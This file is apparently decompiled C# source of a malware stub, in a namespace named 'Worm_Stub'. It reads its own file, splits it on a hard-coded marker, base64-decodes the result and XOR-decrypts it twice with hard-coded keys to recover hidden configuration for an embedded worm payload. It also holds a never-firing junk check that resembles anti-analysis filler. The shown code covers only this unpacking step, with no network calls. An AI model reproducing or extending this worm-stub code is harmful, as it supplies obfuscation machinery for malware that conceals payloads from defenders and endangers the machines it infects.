using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Worm_Stub;

public class Stub
{
	private const string MasterDecryptionKey = "kjkrentejkr4o457396njkfdh32485734nksdmuenfreu435974fjhbfdj";

	private const string MasterSplitKey = "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf";

	[DebuggerNonUserCode]
	public Stub()
	{
	}

	public string[] GetParameters(string StubLocation)
	{
		string empty = string.Empty;
		string[] array = null;
		string text = null;
		string[] array2 = null;
		List<string> list = new List<string>();
		try
		{
			array = Strings.Split(File.ReadAllText(StubLocation), "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf", -1, (CompareMethod)0);
			text = Encoding.Unicode.GetString(Convert.FromBase64String(array[1]));
			array = Strings.Split(text, "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf", -1, (CompareMethod)0);
			text = DecryptXOR(array[1], "kjkrentejkr4o457396njkfdh32485734nksdmuenfreu435974fjhbfdj");
			array = Strings.Split(text, "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf", -1, (CompareMethod)0);
			text = array[0];
			empty = array[1];
			text = DecryptXOR(text, empty);
			array2 = Strings.Split(text, "djwefneuh435243kjnfjkweuhgre453245kjnvjkfnejrkf", -1, (CompareMethod)0);
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				if (Operators.CompareString(text2, string.Empty, false) != 0)
				{
					list.Add(text2);
				}
			}
			return list.ToArray();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string[] result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string DecryptXOR(string StringToDecrypt1, string DecryptionKey)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(1);
		string text2 = Conversions.ToString(2);
		if (Operators.CompareString(text, text2, false) > 0)
		{
			MessageBox.Show("error", "error");
		}
		if (Operators.CompareString(text2, text, false) <= 0)
		{
		}
		checked
		{
			try
			{
				string text3 = string.Empty;
				long num = (long)Math.Round((double)Strings.Len(StringToDecrypt1) / 2.0);
				long num2 = 1L;
				while (true)
				{
					long num3 = num2;
					long num4 = num;
					if (num3 > num4)
					{
						break;
					}
					int num5 = (int)Math.Round(Conversion.Val("&H" + Strings.Mid(StringToDecrypt1, (int)(2L * num2 - 1L), 2)));
					int num6 = Strings.Asc(Strings.Mid(DecryptionKey, (int)(unchecked(num2 % Strings.Len(DecryptionKey)) + 1L), 1));
					text3 += Conversions.ToString(Strings.Chr(num5 ^ num6));
					num2++;
				}
				return text3;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string empty = string.Empty;
				ProjectData.ClearProjectError();
				return empty;
			}
		}
	}
}
